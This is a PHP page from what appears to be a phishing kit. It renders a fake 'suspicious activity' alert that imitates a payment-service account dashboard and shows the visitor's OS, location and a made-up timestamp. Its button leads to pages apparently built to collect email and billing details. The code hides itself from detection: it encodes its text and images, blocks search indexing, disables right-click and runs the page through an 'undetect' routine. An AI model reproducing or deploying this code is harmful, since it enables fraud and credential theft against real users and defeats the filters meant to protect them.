<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "suspicious";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

if ($api->config("email") == "on") {
  $link = "../restore/confirm_email";
} else {
  $link = "../restore/confirm_billing";
}

$html = '
<!DOCTYPE html>
<html>
<head>
<title>'.$api->text_encode($text['0'].": ".$text['3']).'</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount.dashboard.css").'">
</head>
<body oncontextmenu="return false">
<div class="grey-background header-body">
<div id="header">
<div class="container-fluid center-block-big">
<table>
<tr>
<td>
<img src="'.$api->image_encode("assets/img/favicon.svg")['local'].'" width="106" height="30">
</td>
<td align="right" width="100%">
</td>
</tr>
</table>
</div>
</div>
<div id="wrapper" class="page-container">
<div class="container-fluid trayNavOuter activity-tray activity-tray-large">
<div class="trayNavInner">
<div class="row row-ie">
<div class="col-md-5 logo-block">
<div class="row">
<div class="col-md-12 peek-shield">
<img src="'.$api->image_encode("assets/img/shield.png")['local'].'">
</div>
</div>
<div class="row">
<div class="col-md-12">
<p class="logo-block-text">'.$api->text_encode($text['4']).'</p>
</div>
</div>
</div>
<div class="col-md-7 explanation-wrapper">
<div class="row">
<div class="col-md-12">
<header>
<h4 class="flat-large-header">'.$api->text_encode($text['5']).'</h4>
</header>
</div>
</div>
<div class="row">
<div class="col-md-12 explanation-block">
<p>'.$api->text_encode($text['6']).'</p>
</div>
</div>
<div class="row">
<div class="col-md-12">
<div class="activities details-box">
<div class="header row no-transactions white-header">
<label class="login-wrapper">
<span class="device">'.$api->text_encode($text['7']." ".$_SESSION['os']).'</span>
<span class="location span">'.$api->text_encode($text['8']." ".$_SESSION['state'].", ".$_SESSION['country']).'</span>
<span class="time span">'.$api->text_encode(date('F j, Y', strtotime('-1 days'))." ".date('h:i A')).'</span>
</label>
</div>
</div>
</div>
<p style="padding-left:15px;">'.$api->text_encode($text['9']).'</p>
<div class="buttons" style="padding-left:15px;">
<a href="'.$link.'" class="btn btn-primary button">'.$api->text_encode($text['10']).'</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-nav">
<div class="site-links container-fluid" style="align: right">
<ul class="navlist">
<li><a href="#">'.$api->text_encode($text['11']).'</a></li>
<li><a href="#">'.$api->text_encode($text['12']).'</a></li>
</ul>
</div>
</div>
<div class="footer-legal">
<div class="container-fluid">
<span class="copyright">'.$api->text_encode($text['14']).' &copy; '.$api->text_encode("1999 - ".gmdate('Y')." ".$text['18']." ".$text['15']).'</span>
<span class="short-copyright">&copy; '.$api->text_encode("1999 - ".gmdate('Y')).'</span>
<ul class="navlist footer-list">
<li><a href="#">'.$api->text_encode($text['16']).'</a></li>
<li><a href="#">'.$api->text_encode($text['17']).'</a></li>
</ul>
</div>
</div>
</footer>
</body>
</html>';

$api->undetect($html);
?>
